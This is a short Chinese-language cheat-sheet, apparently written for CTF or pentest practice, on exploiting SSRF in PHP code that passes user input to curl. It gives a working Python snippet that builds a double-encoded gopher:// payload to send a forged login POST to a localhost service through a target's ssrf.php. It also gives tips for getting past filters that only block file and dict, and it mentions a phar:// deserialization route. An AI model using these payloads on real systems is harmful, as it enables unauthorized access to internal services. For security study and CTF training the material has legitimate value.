# gopher:// SSRF：PHP curl 场景的载荷编码

**一句话**：PHP 里 `$url = $_POST['url']; curl_setopt($ch, CURLOPT_URL, $url)` 这种 SSRF，用 gopher:// 发任意 HTTP 请求时，载荷必须**预编码 + 双重编码**，否则被 PHP 的 form 解码拆散、curl 解析不了。

## 触发信号

- SSRF 点是 `curl_setopt(CURLOPT_URL, $url)`（`$url` 来自 `$_GET`/`$_POST`），过滤只拦 `file|dict`。
- 目标需要「从 localhost 发 POST」「打内网服务」「绕过只允许本地登录」这类。
- gopher 直接发却返回空 / 只有 SSRF 页自身源码。

## 核心套路

PHP 对 `$_POST['url']` 先做一次 form-urlencoded 解码，再交给 curl。所以：

1. 载荷里的空格/CRLF **预编码**成 `%20`/`%0d%0a`（留给 curl 解码成原始字节）。
2. 外层发送时再把 `%` 编码成 `%25`（即双重编码），让 PHP 解一次后 curl 收到 `%20`/`%0d%0a`。
3. body 里的 `&` 必须 `%26`（否则 PHP 当参数分隔符，`url` 值被截断），`=` 建议 `%3d`。

```python
import httpx
from urllib.parse import quote

body = "username=admin&password=admin"
inner = (f"POST / HTTP/1.1\r\nHost: 127.0.0.1\r\n"
         f"Content-Type: application/x-www-form-urlencoded\r\n"
         f"Content-Length: {len(body)}\r\n\r\n{body}")
gopher = "gopher://127.0.0.1:80/_" + quote(inner, safe="")
# httpx 的 data= 会自动把 gopher 里的 % 再编码成 %25，正好是需要的双重编码
r = httpx.post("http://target/ssrf.php", data={"url": gopher})
```

## 坑

- **直接用原始空格/CRLF 发** → PHP 解码成原始字节 → curl 无法解析 URL → 空响应（看起来像 gopher 不支持，其实不是）。
- **裸 `&`** → PHP 拆参数 → `url` 值被截断 → gopher 请求不完整。
- **过滤只拦 `file|dict`** 时，`gopher` 通常没拦——这就是留给你的后门。
- 判别「gopher 到底通没通」：看响应里有没有内网服务的原始 HTTP 回包（如 `HTTP/1.1 200 OK` + `Server: Apache`），而不是只看长度。

## 关联

- SSRF 相关的另一条路是 phar:// 反序列化（见 writeandcheck 复盘）。
